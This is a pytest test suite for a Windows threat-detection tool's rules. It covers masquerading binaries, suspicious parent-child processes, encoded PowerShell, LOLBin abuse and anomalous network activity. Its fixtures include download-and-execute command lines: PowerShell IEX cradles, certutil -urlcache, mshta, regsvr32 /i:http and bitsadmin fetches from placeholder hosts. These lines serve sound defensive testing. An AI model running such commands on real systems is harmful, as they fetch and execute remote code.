"""Every rule has positive and negative tests (Phase 5 exit criterion)."""

from __future__ import annotations

import base64
from datetime import timedelta

import pytest

from fixtures.detection import (
    NOW,
    UNSIGNED,
    VALID,
    appeared,
    enriched,
    host,
    owned,
    proc,
    settings,
    socket_event,
)
from fixtures.fakes import minutes
from threatlens.core.models import (
    Confidence,
    ConnectionState,
    Direction,
    EventType,
    Observation,
    SignatureInfo,
    SignatureStatus,
    TransportProtocol,
)
from threatlens.detection.rules import RULE_CLASSES, build_rules, rule_catalog
from threatlens.detection.rules.execution import (
    LolbinProxyExecution,
    SuspiciousParentChild,
    SuspiciousPowerShell,
    UnusualExecutionChain,
    decode_encoded_command,
    parse_powershell,
)
from threatlens.detection.rules.network import (
    FirstSeenExecutableOutbound,
    HighFrequencyOutbound,
    NewListeningPort,
    NewProcessExternalConnection,
    UncommonRemotePort,
)
from threatlens.detection.rules.origin import (
    DeceptiveFileName,
    InvalidSignature,
    SystemBinaryMasquerading,
    TempDirectoryExecution,
    UnsignedUserWritableExecutable,
)
from threatlens.security.signatures import CERT_E_EXPIRED, CERT_E_UNTRUSTEDROOT, TRUST_E_BAD_DIGEST

PROGRAM_FILES_APP = r"C:\Program Files\Contoso\app.exe"


def test_catalog_is_consistent() -> None:
    ids = [cls.meta.rule_id for cls in RULE_CLASSES]
    assert len(ids) == len(set(ids)) >= 10
    assert [m.rule_id for m in rule_catalog()] == sorted(ids)
    for rule in build_rules(settings()):
        assert rule.meta.false_positives and rule.meta.recommendation and rule.meta.rationale


# ---------------------------------------------------------------------------- PROC-001


class TestTempDirectoryExecution:
    def test_fires_for_user_temp_with_parent_evidence(self) -> None:
        shell = proc(
            10,
            "powershell.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            created=minutes(8),
        )
        payload = proc(20, "unknown.exe", ppid=10)
        result = TempDirectoryExecution(settings()).evaluate(
            appeared(payload), host([shell, payload])
        )
        assert result is not None and result.rule_id == "PROC-001"
        assert "Temp" in result.evidence[0].description
        assert any("powershell.exe" in e.description for e in result.evidence)

    @pytest.mark.parametrize(
        "path", [r"C:\Windows\Temp\x.exe", r"C:\Users\bob\AppData\Local\Temp\7z\setup.exe"]
    )
    def test_fires_for_other_temp_locations(self, path: str) -> None:
        p = proc(20, "x.exe", path)
        assert TempDirectoryExecution(settings()).evaluate(appeared(p), host([p])) is not None

    @pytest.mark.parametrize(
        "path",
        [
            PROGRAM_FILES_APP,
            r"C:\Users\alice\AppData\Local\Programs\App\app.exe",
            r"C:\Temporary\app.exe",
        ],
    )
    def test_silent_outside_temp(self, path: str) -> None:
        p = proc(20, "app.exe", path)
        assert TempDirectoryExecution(settings()).evaluate(appeared(p), host([p])) is None


# ---------------------------------------------------------------------------- PROC-002


class TestUnsignedUserWritable:
    def test_fires_for_unsigned_in_user_profile(self) -> None:
        p = proc(20, "tool.exe", r"C:\Users\alice\Downloads\tool.exe")
        result = UnsignedUserWritableExecutable(settings()).evaluate(
            enriched(p), host([p], enrichment={p.process_key: UNSIGNED})
        )
        assert result is not None
        assert [e.observation for e in result.evidence][:2] == [
            Observation.OBSERVED,
            Observation.INFERRED,
        ]

    def test_fires_for_writable_folder_inside_windows(self) -> None:
        p = proc(20, "svc.exe", r"C:\Windows\Tasks\svc.exe")
        state = host([p], enrichment={p.process_key: UNSIGNED})
        assert UnsignedUserWritableExecutable(settings()).evaluate(enriched(p), state) is not None

    @pytest.mark.parametrize(
        ("path", "signature"),
        [
            (r"C:\Users\alice\Downloads\tool.exe", VALID),
            (r"C:\Users\alice\Downloads\tool.exe", SignatureInfo(status=SignatureStatus.UNKNOWN)),
            (PROGRAM_FILES_APP, UNSIGNED),  # admin-protected location
        ],
    )
    def test_silent_when_signed_unknown_or_protected(
        self, path: str, signature: SignatureInfo
    ) -> None:
        p = proc(20, "tool.exe", path)
        state = host([p], enrichment={p.process_key: signature})
        assert UnsignedUserWritableExecutable(settings()).evaluate(enriched(p), state) is None


# ---------------------------------------------------------------------------- SIG-001


class TestInvalidSignature:
    @pytest.mark.parametrize(
        ("code", "score", "confidence"),
        [
            (TRUST_E_BAD_DIGEST, 45, Confidence.HIGH),
            (CERT_E_UNTRUSTEDROOT, 30, Confidence.MEDIUM),
            (CERT_E_EXPIRED, 10, Confidence.LOW),
        ],
    )
    def test_scores_by_failure_kind(self, code: int, score: int, confidence: Confidence) -> None:
        p = proc(20, "app.exe", PROGRAM_FILES_APP)
        signature = SignatureInfo(
            status=SignatureStatus.INVALID, error_code=code, signer=None, detail="x"
        )
        result = InvalidSignature(settings()).evaluate(
            enriched(p), host([p], enrichment={p.process_key: signature})
        )
        assert result is not None and (result.score, result.confidence) == (score, confidence)

    @pytest.mark.parametrize("signature", [VALID, UNSIGNED, None])
    def test_silent_for_valid_unsigned_or_missing(self, signature: SignatureInfo | None) -> None:
        p = proc(20, "app.exe", PROGRAM_FILES_APP)
        state = host([p], enrichment={p.process_key: signature})
        assert InvalidSignature(settings()).evaluate(enriched(p), state) is None


# ---------------------------------------------------------------------------- PROC-005


class TestSystemBinaryMasquerading:
    @pytest.mark.parametrize(
        ("name", "path"),
        [
            ("svchost.exe", r"C:\Users\alice\AppData\Roaming\svchost.exe"),
            ("lsass.exe", r"C:\Windows\lsass.exe"),
            ("explorer.exe", r"C:\ProgramData\explorer.exe"),
        ],
    )
    def test_fires_outside_legitimate_directory(self, name: str, path: str) -> None:
        p = proc(20, name, path)
        result = SystemBinaryMasquerading(settings()).evaluate(appeared(p), host([p]))
        assert result is not None and result.confidence is Confidence.HIGH

    @pytest.mark.parametrize(
        ("name", "path"),
        [
            ("svchost.exe", r"C:\Windows\System32\svchost.exe"),
            ("svchost.exe", r"C:\WINDOWS\SysWOW64\svchost.exe"),
            ("explorer.exe", r"C:\Windows\explorer.exe"),
            ("WmiPrvSE.exe", r"C:\Windows\System32\wbem\WmiPrvSE.exe"),  # real FP found and fixed
            ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            ("TiWorker.exe", r"C:\Windows\WinSxS\amd64_x\TiWorker.exe"),  # not in the list at all
            ("app.exe", r"C:\Users\alice\app.exe"),
        ],
    )
    def test_silent_in_legitimate_directory(self, name: str, path: str) -> None:
        p = proc(20, name, path)
        assert SystemBinaryMasquerading(settings()).evaluate(appeared(p), host([p])) is None


# ---------------------------------------------------------------------------- PROC-008


class TestDeceptiveFileName:
    @pytest.mark.parametrize(
        "name",
        ["invoice.pdf.exe", "Report.DOCX.scr", "photo.jpg      .exe", "invoice\u202etxt.exe"],
    )
    def test_fires_for_disguised_names(self, name: str) -> None:
        p = proc(20, name)
        assert DeceptiveFileName(settings()).evaluate(appeared(p), host([p])) is not None

    @pytest.mark.parametrize(
        "name", ["setup.exe", "python3.13.exe", "node.js.exe", "app.v2.exe", "résumé-builder.exe"]
    )
    def test_silent_for_ordinary_names(self, name: str) -> None:
        p = proc(20, name)
        assert DeceptiveFileName(settings()).evaluate(appeared(p), host([p])) is None


# ---------------------------------------------------------------------------- PROC-003


class TestSuspiciousParentChild:
    @pytest.mark.parametrize(
        ("parent", "child", "technique"),
        [
            ("WINWORD.EXE", "powershell.exe", "T1204.002"),
            ("excel.exe", "certutil.exe", "T1204.002"),
            ("wmiprvse.exe", "cmd.exe", "T1047"),
            ("services.exe", "cmd.exe", "T1569.002"),
            ("w3wp.exe", "cmd.exe", "T1505.003"),
            ("chrome.exe", "mshta.exe", "T1189"),
        ],
    )
    def test_fires_for_unusual_pairs(self, parent: str, child: str, technique: str) -> None:
        p = proc(10, parent, rf"C:\Program Files\X\{parent}", created=minutes(8))
        c = proc(
            20, child, rf"C:\Windows\System32\{child}", ppid=10, cmdline=[child, "/c", "whoami"]
        )
        result = SuspiciousParentChild(settings()).evaluate(appeared(c), host([p, c]))
        assert result is not None and technique in result.mitre_techniques

    @pytest.mark.parametrize(
        ("parent", "child"),
        [
            ("explorer.exe", "powershell.exe"),
            ("chrome.exe", "cmd.exe"),  # native-messaging hosts: deliberately excluded
            ("winword.exe", "splwow64.exe"),
            ("services.exe", "svchost.exe"),
        ],
    )
    def test_silent_for_normal_pairs(self, parent: str, child: str) -> None:
        p = proc(10, parent, rf"C:\Windows\{parent}", created=minutes(8))
        c = proc(20, child, rf"C:\Windows\System32\{child}", ppid=10)
        assert SuspiciousParentChild(settings()).evaluate(appeared(c), host([p, c])) is None

    def test_silent_when_parent_pid_was_reused(self) -> None:
        impostor = proc(10, "winword.exe", created=minutes(9.5))  # newer than the child
        c = proc(20, "cmd.exe", ppid=10, created=minutes(9))
        assert SuspiciousParentChild(settings()).evaluate(appeared(c), host([impostor, c])) is None


# ---------------------------------------------------------------------------- TREE-001


class TestUnusualExecutionChain:
    def test_fires_for_document_interpreter_payload_chain(self) -> None:
        word = proc(10, "winword.exe", PROGRAM_FILES_APP, created=minutes(7))
        shell = proc(20, "powershell.exe", ppid=10, created=minutes(8))
        payload = proc(30, "stage2.exe", ppid=20, created=minutes(9))
        result = UnusualExecutionChain(settings()).evaluate(
            appeared(payload), host([word, shell, payload])
        )
        assert result is not None
        assert (
            result.evidence[0].value == "winword.exe (10) → powershell.exe (20) → stage2.exe (30)"
        )

    def test_fires_through_two_interpreters(self) -> None:
        excel = proc(10, "excel.exe", created=minutes(6))
        cmd = proc(20, "cmd.exe", ppid=10, created=minutes(7))
        ps = proc(30, "powershell.exe", ppid=20, created=minutes(8))
        payload = proc(40, "x.exe", ppid=30, created=minutes(9))
        assert (
            UnusualExecutionChain(settings()).evaluate(
                appeared(payload), host([excel, cmd, ps, payload])
            )
            is not None
        )

    @pytest.mark.parametrize(
        ("origin", "interpreter", "subject"),
        [
            ("explorer.exe", "powershell.exe", "tool.exe"),  # user ran a shell
            ("chrome.exe", "cmd.exe", "host.exe"),  # browser native messaging
            ("winword.exe", "powershell.exe", "conhost.exe"),  # console host is infrastructure
            ("winword.exe", "splwow64.exe", "x.exe"),  # no interpreter in between
        ],
    )
    def test_silent_for_ordinary_chains(self, origin: str, interpreter: str, subject: str) -> None:
        a = proc(10, origin, created=minutes(7))
        b = proc(20, interpreter, ppid=10, created=minutes(8))
        c = proc(30, subject, ppid=20, created=minutes(9))
        assert UnusualExecutionChain(settings()).evaluate(appeared(c), host([a, b, c])) is None


# ---------------------------------------------------------------------------- PROC-006


def encode(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


class TestSuspiciousPowerShell:
    @pytest.mark.parametrize("flag", ["-EncodedCommand", "-enc", "-e", "-ec", "/ENC"])
    def test_fires_for_encoded_command_with_decoded_evidence(self, flag: str) -> None:
        p = proc(
            20,
            "powershell.exe",
            cmdline=[
                "powershell.exe",
                "-NoP",
                "-W",
                "Hidden",
                flag,
                encode("Get-Process -Password hunter2"),
            ],
        )
        result = SuspiciousPowerShell(settings()).evaluate(appeared(p), host([p]))
        assert result is not None and result.score == 30
        decoded = next(e for e in result.evidence if e.field == "decoded_command")
        assert (
            decoded.value is not None
            and "Get-Process" in decoded.value
            and "hunter2" not in decoded.value
        )
        assert any(e.field == "window_style" for e in result.evidence)

    def test_fires_for_download_cradle(self) -> None:
        cradle = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')"
        p = proc(20, "powershell.exe", cmdline=["powershell.exe", "-NoProfile", "-Command", cradle])
        result = SuspiciousPowerShell(settings()).evaluate(appeared(p), host([p]))
        assert result is not None and result.score == 35 and "T1105" in result.mitre_techniques

    def test_fires_for_cradle_hidden_inside_encoded_command(self) -> None:
        p = proc(
            20, "pwsh.exe", cmdline=["pwsh.exe", "-enc", encode("iwr http://example.test/x | iex")]
        )
        result = SuspiciousPowerShell(settings()).evaluate(appeared(p), host([p]))
        assert result is not None and result.score == 35

    @pytest.mark.parametrize(
        "cmdline",
        [
            # Claude Code's own shell launcher on this machine: Bypass + -Command is not suspicious.
            [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                "$x = 1",
            ],
            [
                "powershell.exe",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                "backup.ps1",
                "-e",
                "notencoded",
            ],  # -e after -File is a script arg
            [
                "powershell.exe",
                "-Command",
                "Invoke-WebRequest https://example.test -OutFile a.zip",
            ],  # download without execute
            ["powershell.exe", "-WindowStyle", "Hidden", "-File", "task.ps1"],  # hidden alone
        ],
    )
    def test_silent_for_ordinary_automation(self, cmdline: list[str]) -> None:
        p = proc(20, "powershell.exe", cmdline=cmdline)
        assert SuspiciousPowerShell(settings()).evaluate(appeared(p), host([p])) is None

    def test_silent_for_non_powershell_or_unreadable_command_line(self) -> None:
        other = proc(20, "cmd.exe", cmdline=["cmd.exe", "-enc", encode("x")])
        unreadable = proc(21, "powershell.exe", cmdline=None)
        state = host([other, unreadable])
        rule = SuspiciousPowerShell(settings())
        assert rule.evaluate(appeared(other), state) is None
        assert rule.evaluate(appeared(unreadable), state) is None

    def test_parsing_helpers(self) -> None:
        assert parse_powershell(["powershell.exe", "-w", "h", "-e", "AAAA"]).encoded == "AAAA"
        assert parse_powershell(["powershell.exe", "-w", "h", "-e", "AAAA"]).hidden_window
        assert parse_powershell(["powershell.exe", "-ExecutionPolicy", "Bypass"]).encoded is None
        assert decode_encoded_command(encode("hello")) == "hello"
        assert decode_encoded_command("!!!not-base64") is None


# ---------------------------------------------------------------------------- PROC-007


class TestLolbinProxyExecution:
    @pytest.mark.parametrize(
        ("name", "cmdline", "technique"),
        [
            (
                "certutil.exe",
                ["certutil.exe", "-urlcache", "-split", "-f", "http://x.test/a.exe", "a.exe"],
                "T1105",
            ),
            ("certutil.exe", ["certutil", "-decode", "in.b64", "out.exe"], "T1140"),
            ("mshta.exe", ["mshta.exe", "https://x.test/p.hta"], "T1218.005"),
            ("mshta.exe", ["mshta.exe", 'javascript:a=GetObject("script:x")'], "T1218.005"),
            (
                "rundll32.exe",
                ["rundll32.exe", 'javascript:"\\..\\mshtml,RunHTMLApplication"'],
                "T1218.011",
            ),
            (
                "regsvr32.exe",
                ["regsvr32", "/s", "/n", "/u", "/i:http://x.test/f.sct", "scrobj.dll"],
                "T1218.010",
            ),
            (
                "bitsadmin.exe",
                ["bitsadmin", "/transfer", "job", "http://x.test/a.exe", "C:\\a.exe"],
                "T1197",
            ),
            ("msiexec.exe", ["msiexec", "/q", "/i", "http://x.test/p.msi"], "T1218.007"),
        ],
    )
    def test_fires_for_abuse_patterns(self, name: str, cmdline: list[str], technique: str) -> None:
        p = proc(20, name, rf"C:\Windows\System32\{name}", cmdline=cmdline)
        result = LolbinProxyExecution(settings()).evaluate(appeared(p), host([p]))
        assert result is not None and technique in result.mitre_techniques

    @pytest.mark.parametrize(
        ("name", "cmdline"),
        [
            ("certutil.exe", ["certutil", "-hashfile", "a.exe", "SHA256"]),
            ("rundll32.exe", ["rundll32.exe", "shell32.dll,Control_RunDLL", "desk.cpl"]),
            ("regsvr32.exe", ["regsvr32", "/s", r"C:\Program Files\X\x.dll"]),
            ("msiexec.exe", ["msiexec", "/i", r"C:\Downloads\app.msi"]),
            (
                "msiexec.exe",
                ["msiexec", "/i", "https://intranet.test/app.msi"],
            ),  # interactive, not quiet
            ("notepad.exe", ["notepad.exe", "https://x.test"]),
        ],
    )
    def test_silent_for_ordinary_use(self, name: str, cmdline: list[str]) -> None:
        p = proc(20, name, rf"C:\Windows\System32\{name}", cmdline=cmdline)
        assert LolbinProxyExecution(settings()).evaluate(appeared(p), host([p])) is None


# ---------------------------------------------------------------------------- PROC-004


class TestNewProcessExternalConnection:
    def test_fires_when_unsigned_process_connects_within_window(self) -> None:
        p = proc(20, "dropper.exe", created=minutes(9))
        conn = owned(p, "185.1.2.3", 4444, created=minutes(9) + timedelta(seconds=2))
        state = host([p], connections=[conn], enrichment={p.process_key: UNSIGNED})
        result = NewProcessExternalConnection(settings()).evaluate(socket_event(conn), state)
        assert result is not None and "2.0s after" in result.summary
        assert result.network[0].remote_port == 4444

    def test_deferred_until_enrichment_then_fires(self) -> None:
        p = proc(20, "dropper.exe", created=minutes(9))
        conn = owned(p, "185.1.2.3", 443)
        rule = NewProcessExternalConnection(settings())
        pending = host([p], connections=[conn])  # no enrichment yet
        assert rule.evaluate(socket_event(conn), pending) is None
        done = host([p], connections=[conn], enrichment={p.process_key: UNSIGNED})
        assert rule.evaluate(enriched(p), done) is not None

    def test_deferred_then_silent_when_signature_turns_out_valid(self) -> None:
        p = proc(20, "app.exe", created=minutes(9))
        conn = owned(p, "185.1.2.3", 443)
        rule = NewProcessExternalConnection(settings())
        assert rule.evaluate(socket_event(conn), host([p], connections=[conn])) is None
        assert (
            rule.evaluate(
                enriched(p), host([p], connections=[conn], enrichment={p.process_key: VALID})
            )
            is None
        )

    @pytest.mark.parametrize(
        ("delay", "remote", "exe"),
        [
            (60, "185.1.2.3", None),  # long after start
            (2, "10.0.0.9", None),  # private destination
            (2, "185.1.2.3", PROGRAM_FILES_APP),  # trusted location
        ],
    )
    def test_silent(self, delay: int, remote: str, exe: str | None) -> None:
        p = proc(20, "app.exe", exe, created=minutes(9))
        conn = owned(p, remote, 443, created=minutes(9) + timedelta(seconds=delay))
        state = host([p], connections=[conn], enrichment={p.process_key: UNSIGNED})
        assert NewProcessExternalConnection(settings()).evaluate(socket_event(conn), state) is None


# ---------------------------------------------------------------------------- NET-004


class TestUncommonRemotePort:
    def test_fires_for_uncommon_port(self) -> None:
        p = proc(20, "tool.exe")
        conn = owned(p, "185.1.2.3", 4444)
        state = host([p], connections=[conn], enrichment={p.process_key: UNSIGNED})
        result = UncommonRemotePort(settings()).evaluate(socket_event(conn), state)
        assert result is not None and result.score == 10 and result.confidence is Confidence.LOW
        assert result.dedup_key == "4444"

    @pytest.mark.parametrize(
        ("port", "remote", "signature"),
        [
            (443, "185.1.2.3", UNSIGNED),
            (4444, "192.168.1.20", UNSIGNED),
            (4444, "185.1.2.3", VALID),
        ],
    )
    def test_silent_for_common_port_private_address_or_signed(
        self, port: int, remote: str, signature: SignatureInfo
    ) -> None:
        p = proc(20, "tool.exe")
        conn = owned(p, remote, port)
        state = host([p], connections=[conn], enrichment={p.process_key: signature})
        assert UncommonRemotePort(settings()).evaluate(socket_event(conn), state) is None


# ---------------------------------------------------------------------------- NET-001


class TestFirstSeenExecutableOutbound:
    def test_fires_on_first_outbound_by_new_executable_only_once(self) -> None:
        p = proc(20, "new.exe")
        first, second = owned(p, local_port=1), owned(p, local_port=2)
        state = host([p], connections=[first, second], enrichment={p.process_key: UNSIGNED})
        rule = FirstSeenExecutableOutbound(settings())
        assert rule.evaluate(socket_event(first), state) is not None
        assert rule.evaluate(socket_event(second), state) is None

    def test_silent_for_executable_already_communicating_at_startup(self) -> None:
        p = proc(20, "old.exe")
        inventory, later = owned(p, local_port=1), owned(p, local_port=2)
        state = host([p], connections=[inventory, later], enrichment={p.process_key: UNSIGNED})
        rule = FirstSeenExecutableOutbound(settings())
        assert (
            rule.evaluate(socket_event(inventory, EventType.CONNECTION_DISCOVERED), state) is None
        )
        assert rule.evaluate(socket_event(later), state) is None

    def test_silent_for_signed_or_loopback(self) -> None:
        signed = proc(20, "signed.exe")
        loop = proc(21, "loop.exe")
        a, b = owned(signed), owned(loop, "127.0.0.1", 8080)
        state = host(
            [signed, loop],
            connections=[a, b],
            enrichment={signed.process_key: VALID, loop.process_key: UNSIGNED},
        )
        rule = FirstSeenExecutableOutbound(settings())
        assert rule.evaluate(socket_event(a), state) is None
        assert rule.evaluate(socket_event(b), state) is None


# ---------------------------------------------------------------------------- NET-002


class TestNewListeningPort:
    def listener(self, p: object, address: str, port: int = 9001) -> object:
        return owned(
            p,
            None,
            None,
            local=address,
            local_port=port,
            state=ConnectionState.LISTEN,
            direction=Direction.LISTENING,
        )  # type: ignore[arg-type]

    @pytest.mark.parametrize("address", ["0.0.0.0", "::", "192.168.1.5"])
    def test_fires_for_network_reachable_listener(self, address: str) -> None:
        p = proc(20, "backdoor.exe")
        item = self.listener(p, address)
        result = NewListeningPort(settings()).evaluate(
            socket_event(item, EventType.LISTENER_OPENED), host([p])
        )  # type: ignore[arg-type]
        assert result is not None and "9001" in result.summary

    def test_silent_for_loopback_or_trusted_service(self) -> None:
        local = proc(20, "devserver.exe")
        service = proc(21, "svc.exe", r"C:\Windows\System32\svc.exe")
        state = host([local, service])
        rule = NewListeningPort(settings())
        assert (
            rule.evaluate(
                socket_event(self.listener(local, "127.0.0.1"), EventType.LISTENER_OPENED), state
            )
            is None
        )  # type: ignore[arg-type]
        assert (
            rule.evaluate(
                socket_event(self.listener(service, "0.0.0.0"), EventType.LISTENER_OPENED), state
            )
            is None
        )  # type: ignore[arg-type]


# ---------------------------------------------------------------------------- NET-003


class TestHighFrequencyOutbound:
    def test_fires_for_fan_out_to_many_hosts_on_one_port(self) -> None:
        p = proc(20, "scanner.exe")
        state = host([p])
        rule = HighFrequencyOutbound(settings())
        results = [
            rule.evaluate(
                socket_event(
                    owned(p, f"185.1.2.{i}", 445, local_port=50000 + i),
                    at=NOW + timedelta(seconds=i),
                ),
                state,
            )
            for i in range(1, 5)
        ]
        assert results[:3] == [None, None, None]
        assert (
            results[3] is not None
            and results[3].dedup_key == "fanout"
            and "T1046" in results[3].mitre_techniques
        )

    def test_fires_for_unanswered_attempts(self) -> None:
        p = proc(20, "beacon.exe")
        state = host([p])
        rule = HighFrequencyOutbound(settings())
        last = None
        for i in range(3):
            last = rule.evaluate(
                socket_event(
                    owned(
                        p, "185.1.2.3", 8443, local_port=50000 + i, state=ConnectionState.SYN_SENT
                    )
                ),
                state,
            )
        assert last is not None and last.dedup_key == "attempts"

    def test_silent_when_spread_over_time_or_trusted(self) -> None:
        slow = proc(20, "slow.exe")
        browser = proc(21, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe")
        state = host([slow, browser])
        rule = HighFrequencyOutbound(settings())
        for i in range(10):  # one connection every 2 minutes: window never holds enough
            assert (
                rule.evaluate(
                    socket_event(
                        owned(slow, f"185.1.2.{i}", 443, local_port=i),
                        at=NOW + timedelta(minutes=2 * i),
                    ),
                    state,
                )
                is None
            )
        for i in range(10):
            assert (
                rule.evaluate(
                    socket_event(owned(browser, f"185.1.3.{i}", 443, local_port=i)), state
                )
                is None
            )

    def test_inbound_connections_are_not_counted(self) -> None:
        p = proc(20, "server.exe")
        state = host([p])
        rule = HighFrequencyOutbound(settings())
        for i in range(10):
            inbound = owned(
                p,
                f"185.1.2.{i}",
                51000,
                local_port=8080,
                direction=Direction.INBOUND,
                protocol=TransportProtocol.TCP,
            )
            assert rule.evaluate(socket_event(inbound), state) is None
